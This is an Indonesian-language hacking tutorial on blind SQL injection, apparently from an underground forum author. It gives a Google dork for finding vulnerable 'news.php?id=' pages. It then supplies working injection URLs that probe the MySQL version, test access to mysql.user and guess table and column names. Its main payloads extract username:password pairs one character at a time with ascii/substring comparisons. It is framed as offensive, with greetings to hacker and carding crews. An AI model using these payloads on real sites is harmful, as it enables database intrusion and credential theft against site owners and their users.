=========================================================
Tutorial Blind SQL Injection Referensi Indonesia
=========================================================
[+]Author	 : jos_ali_joe
[+]Contact	 : josalijoe[at]yahoo[dot]com
[+]Home 	 : http://josalijoe.wordpress.com/ & http://indonesiancoder.com/

Pendahuluan 

Maaf sebelum nya disini saya hanya memberikan apa yang memang saya pelajari tentang Blind SQL Injectiuon
kalau mungkin dalam penjelasan ini kurang di mengeti mohon di maklumi hanya tutor cupu dari saya
dan buat yang sudah master tentang Blind SQL kalau dari penjelasan saya ada kesalahan mohon di luruskan

[~] Apa Itu Blind SQL Injection 

Mari di sini kita membahas Blind SQL tanpa metode SQL Injection 
Mungkin sudah banyak yang tahu tentang metode SQL Inject. Oke Lanjut :D
Blind SQL Ini adalah metode hacking yang memungkinkan seorang Attacker yang tidak sah untuk mengakses server database. 
Hal ini difasilitasi oleh sebuah kesalahan pengkodean umum: program menerima data dari klien dan mengeksekusi query SQL tanpa terlebih dahulu memvalidasi masukan klien. 
Attacker kemudian bebas untuk mengekstrak, memodifikasi, menambah, atau menghapus konten dari database
Attacker bahkan bisa menembus server database dan ke dalam operasi dasar system web yang di eksekusi.
Attacker biasanya akan mengetes kerentanan SQL injection dengan mengirimkan masukan aplikasi yang akan menyebabkan server untuk menghasilkan sebuah query SQL yang tidak valid.
Jika server kemudian kembali mengirimkan pesan karena kesalahan ke klien, Si Attacker akan mencoba untuk reverse-engineer bagian dari query SQL yang asli menggunakan informasi yang diperoleh dari pesan kesalahan tersebut.
Ciri khas dari administratif safeguard hanya untuk melarang menampilkan pesan kesalahan database server. 
Sayangnya itu tidak cukup.Jika aplikasi anda tidak ada pesan error, mungkin masih rentan terhadap serangan SQL
Maaf bahasa nya terlalu kurang di mengerti.

[~] Mendeteksi Blind SQL Injection 

Aplikasi Web biasanya menggunakan query SQL dengan masukan klien yang disertakan dalam klausa WHEREUntuk mengambil data dari database. 
Dengan menambahkan kondisi tambahan untuk pernyataan SQL dan mengevaluasi output aplikasi web, Anda dapat menentukan apakah atau tidak aplikasi yang rentan terhadap SQL injection.

[~] Blind SQL Injection

Oke mari lanjut ke contoh Eksekusi Blind SQL Injection setelah di atas sudah menjelaskan tentang apa itu Blind SQL Injection dan Mendeteksi nya.
Yupz Lanjut Kang Disini saya menggunakan Contoh Eksekusi dengan dork [ inurl:news.php?id= ]
Contoh : http://www.site.com/news.php?id=2
Yuk Bareng Kita Inject : 
http://www.site.com/news.php?id=2 dan 1 = 1 <--- ini selalu benar dan load halaman dari web itu sendiri masih normal
http://www.site.com/news.php?id=2 dan 1 = 2 <--- ini salah, jika masih ada beberapa teks, gambar atau beberapa konten yang hilang pada halaman kdari web kembali maka web tersebut rentan terhadap serangan Blind SQL Injection

[~] Mendapatkan Versi My SQL 

Untuk mendapatkan versi MySQL dalam serangan blind harus menggunakan substring:
http://www.site.com/news.php?id=2 and substring(@@version,1,1)=4
Hal ini harus mengembalikan TRUE jika versi MySQL 4. Ganti 4 dengan 5, dan jika kembali query TRUE maka versi adalah 5.

[~] Memeriksa SubSelect

Ketika Kita menginject dan tidak bekerja maka kita gunakan subselect.
http://www.site.com/news.php?id=2 and (select 1)=1
Jika halaman web tersebut berubah normal kemudian subselect bekerja, maka kita akan melihat apakah kita memiliki akses ke mysql.user:
http://www.site.com/news.php?id=2 and (select 1 from mysql.user limit 0,1)=1
Jika load halaman web biasanya kita memiliki akses ke mysql.user dan kemudian kita bisa menarik beberapa load_file password menggunakan () fungsi dan outfile.

[~] Memeriksa Tabel dan Nama Kolom

Ini tingkat susah enak nya Blind SQL itu sendiri di sini keberuntungan dan menebak-nebak bekerja lebih dari apa pun.
http://www.site.com/news.php?id=2 and (select 1 from users limit 0,1)=1
(Dengan limit 0,1 query kita disini mengembalikan 1 baris data, menyebabkan kembali subselect hanya 1 baris, ini sangat penting)
Jika Anda mendapatkan FALSE (beberapa artikel yang hilang), hanya mengubah nama tabel sampai anda menebak yang benar.
Nah seumpama di sini kita sudah mendapatkan nama tabel pengguna, sekarang apa yang kita butuhkan adalah kolom nama. 
Sama dengan nama tabel, kita mulai menebak. Seperti saya bilang sebelumnya coba nama umum untuk kolom:
http://www.site.com/news.php?id=2 and (select substring(concat(1,password),1,1) from users limit 0,1)=1
Jika halaman web yang kita inject biasanya kita tahu bahwa nama kolom adalah password (jika kita mendapatkan
yang false kemudian coba nama umum atau hanya menebak). 
Di sini kita menggabungkan 1 dengan password kolom, kemudian substring kembali karakter pertama (1,1)

[~] Mendapatkan Full Data Dari Web Yang Kita Inject

Kita telah menemukan  tabel kolom username i password sehingga kami akan tarik karakter tersebut.
http://www.site.com/news.php?id=2 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>80
Ok di sini mari kita menarik karakter pertama dari pengguna pertama di tabel pengguna. 
Substring di sini mengembalikan karakter pertama dan 1 karakter panjangnya. ascii () mengkonversi bahwa 1 karakter ke nilai ascii dan kemudian membandingkannya dengan simbol yang lebih besar kemudian>. 
Jadi jika ascii char lebih besar dari 80, beban halaman normal. (TRUE) kita terus mencoba sampai kita mendapatkan false.
http://www.site.com/news.php?id=2 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>95
Disini saya mendapatka True mari kita naikan true nya
http://www.site.com/news.php?id=2 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>98
Belum dapat juga true nya mari kita tambahkan lagi 
http://www.site.com/news.php?id=2 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
Yupz Ternyata False ada di 99 .. :P
Jadi karakter pertama di username adalah char (99). karena (99) adalah huruf 'c' . Coba convert aja di ascii :P
Jadi teruslah Tambahkan sampai kita mendapatkan nya . (Ketika> 0 returns false kita tahu bahwa kita telah mencapai akhir)

[~] Beberapa Pertanyaan

Tanya : Untuk mengetahui char nya dari mana ??
Jawab : http://ascii-table.com/

Tanya : blind sql injection cisa buat inject smua site??
Jawab : bisa buat injek semua site yang memiliki bug sql. klo mau sih yg v5 pun bisa pakai blind injek. tp v5 kan ada table information_schema. jd di manfaatin.

Tanya : Trus buat ngecek bug cuma make ',and 1=1,and 1=0?? ad yg laen??
Jawab : bisa juga pakai tanda minus di belakangnya ( ?id=1- )

Tanya : maksudnya true am false apa? kalau true halaman web tetep? klo false halaman web burbah ?
Jawab : true = return benar sesuai kondisi yg di tentukan.
        false = return salah berdasar kondisi yg di tentukan.
        misal : and 1=1
		=> true jika berita muncul. karena 1=1 adalah benar, jd muncul.
		=> false jika berita tidak muncul

		and 1=2
		=> true jika berita tidak muncul. karena 1=2 adalah salah, jd gak muncul.
		=> false jika berita ternyata muncul

Tanya : blind sql injection bisa nginjek .htm? ato cuma yg php ujungnya?
Tanya : .htm, .php, .asp, dll. itu tergantung config server. ada server yang di config kalau file berextensi .htm adalah php itu bisa saja. 
		tapi normalnya, adalah .php. karena php yg mengelola data di server. tetepi sprt yg gw katakan barusan, gak semua yg .php, tp .htm pun bisa berisi php, sesuai config.

[~] Penutup

Terima kasih sudah membaca tutor cupu dari saya . mohon untuk jangan Tertawa jika ada yang salah .

Referensi : Google - Packetstorm Security - Wikipedia - Hacker Newbie

Grettz : ./Devilzc0de crew - Kebumen Cyber - Explore Crew - Indonesian Hacker - Tecon Crew - Palembang Hacker Link - Codenesia

		 ./Byroe Net - Yogya Carderlink - Wannabe Hacker - anten4 - Hacker Newbie - Packetstorm Security - All Forum Underground Indonesia

My Team : ./Indonesian Coder

Special Thanks :./ Allah S.w.t & Muhammad S.a.w
				./ Terima kasih buat guru Blind Sql : ./ArRay - game over - gt_portnoy
































